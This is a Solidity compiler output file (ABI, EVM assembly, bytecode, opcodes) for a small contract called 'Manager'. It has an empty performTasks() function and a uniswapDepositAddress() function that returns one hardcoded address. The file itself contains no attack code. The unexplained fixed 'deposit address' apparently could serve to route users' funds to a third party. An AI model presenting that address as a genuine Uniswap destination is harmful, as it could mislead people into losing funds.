{
	"ipfs://QmZhUQKp227JdKKufGT81RpgnSGpvy1rgT7YNvP394A2nA": {
		"Manager": {
			"abi": [
				{
					"inputs": [],
					"name": "performTasks",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "uniswapDepositAddress",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "pure",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"ipfs://QmZhUQKp227JdKKufGT81RpgnSGpvy1rgT7YNvP394A2nA\":27:221  contract Manager {\r... */\n  mstore(0x40, 0x80)\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"ipfs://QmZhUQKp227JdKKufGT81RpgnSGpvy1rgT7YNvP394A2nA\":27:221  contract Manager {\r... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x0c0f93a1\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xfeae9ad3\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"ipfs://QmZhUQKp227JdKKufGT81RpgnSGpvy1rgT7YNvP394A2nA\":48:91  function performTasks() public {\r... */\n    tag_3:\n      tag_5\n      tag_6\n      jump\t// in\n    tag_5:\n      stop\n        /* \"ipfs://QmZhUQKp227JdKKufGT81RpgnSGpvy1rgT7YNvP394A2nA\":96:218  function uniswapDepositAddress() public pure returns (address) {\r... */\n    tag_4:\n      tag_7\n      tag_8\n      jump\t// in\n    tag_7:\n      0x40\n      dup1\n      mload\n      0x01\n      dup1\n      0xa0\n      shl\n      sub\n      swap1\n      swap3\n      and\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"ipfs://QmZhUQKp227JdKKufGT81RpgnSGpvy1rgT7YNvP394A2nA\":48:91  function performTasks() public {\r... */\n    tag_6:\n      jump\t// out\n        /* \"ipfs://QmZhUQKp227JdKKufGT81RpgnSGpvy1rgT7YNvP394A2nA\":96:218  function uniswapDepositAddress() public pure returns (address) {\r... */\n    tag_8:\n        /* \"ipfs://QmZhUQKp227JdKKufGT81RpgnSGpvy1rgT7YNvP394A2nA\":171:213  0x4443710D38849FEF5b5346F8A492B0043d7f7d82 */\n      0x4443710d38849fef5b5346f8a492b0043d7f7d82\n        /* \"ipfs://QmZhUQKp227JdKKufGT81RpgnSGpvy1rgT7YNvP394A2nA\":96:218  function uniswapDepositAddress() public pure returns (address) {\r... */\n      swap1\n      jump\t// out\n\n    auxdata: 0xa26469706673582212206a38bc132fcdc47daac4acf61ccea68744b6b76ad5d258a3c90d70d1bbc9819864736f6c634300060c0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "6080604052348015600f57600080fd5b5060b18061001e6000396000f3fe6080604052348015600f57600080fd5b506004361060325760003560e01c80630c0f93a1146037578063feae9ad314603f575b600080fd5b603d6061565b005b60456063565b604080516001600160a01b039092168252519081900360200190f35b565b734443710d38849fef5b5346f8a492b0043d7f7d829056fea26469706673582212206a38bc132fcdc47daac4acf61ccea68744b6b76ad5d258a3c90d70d1bbc9819864736f6c634300060c0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0xB1 DUP1 PUSH2 0x1E PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x32 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xC0F93A1 EQ PUSH1 0x37 JUMPI DUP1 PUSH4 0xFEAE9AD3 EQ PUSH1 0x3F JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x3D PUSH1 0x61 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x45 PUSH1 0x63 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST JUMP JUMPDEST PUSH20 0x4443710D38849FEF5B5346F8A492B0043D7F7D82 SWAP1 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH11 0x38BC132FCDC47DAAC4ACF6 SHR 0xCE 0xA6 DUP8 DIFFICULTY 0xB6 0xB7 PUSH11 0xD5D258A3C90D70D1BBC981 SWAP9 PUSH5 0x736F6C6343 STOP MOD 0xC STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "35400",
						"executionCost": "87",
						"totalCost": "35487"
					},
					"external": {
						"performTasks()": "122",
						"uniswapDepositAddress()": "219"
					}
				},
				"methodIdentifiers": {
					"performTasks()": "0c0f93a1",
					"uniswapDepositAddress()": "feae9ad3"
				}
			},
			"storageLayout": {
				"storage": [],
				"types": null
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}